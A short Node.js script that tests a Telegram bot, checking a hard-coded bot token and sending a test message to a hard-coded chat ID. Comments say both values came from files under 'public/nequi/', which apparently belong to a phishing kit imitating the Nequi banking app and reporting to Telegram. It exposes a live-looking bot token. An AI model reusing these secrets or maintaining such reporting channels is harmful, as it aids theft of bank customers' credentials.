const https = require('https');

// Token found in public/nequi/server.js
const token = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
// Chat ID found in public/nequi/dynamic-key.js
const chatId = '8265640952';

console.log('--- Testing Telegram Bot API (Attempt 2) ---');
console.log(`Token: ${token}`);
console.log(`Chat ID: ${chatId}`);

// 1. Get Me (Check Bot)
const getMeUrl = `https://api.telegram.org/bot${token}/getMe`;
console.log(`\nChecking Bot status... (${getMeUrl})`);

https.get(getMeUrl, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
        console.log('getMe Response:', data);
        
        try {
            const json = JSON.parse(data);
            if (!json.ok) {
                console.error('Bot Error:', json.description);
                return;
            }
            console.log('Bot Name:', json.result.first_name);
            console.log('Bot Username:', json.result.username);

            // 2. Send Message
            const text = encodeURIComponent('Test message from Debug Script with NEW TOKEN 🚀');
            const sendMessageUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
            
            console.log(`\nSending test message...`);
            https.get(sendMessageUrl, (res) => {
                let msgData = '';
                res.on('data', chunk => msgData += chunk);
                res.on('end', () => {
                    console.log('sendMessage Response:', msgData);
                    const msgJson = JSON.parse(msgData);
                    if (!msgJson.ok) {
                        console.error('Send Message Error:', msgJson.description);
                    } else {
                        console.log('Message sent successfully!');
                    }
                });
            });

        } catch (e) {
            console.error('Error parsing JSON:', e);
        }
    });
}).on('error', (err) => {
    console.error('Network Error:', err.message);
});
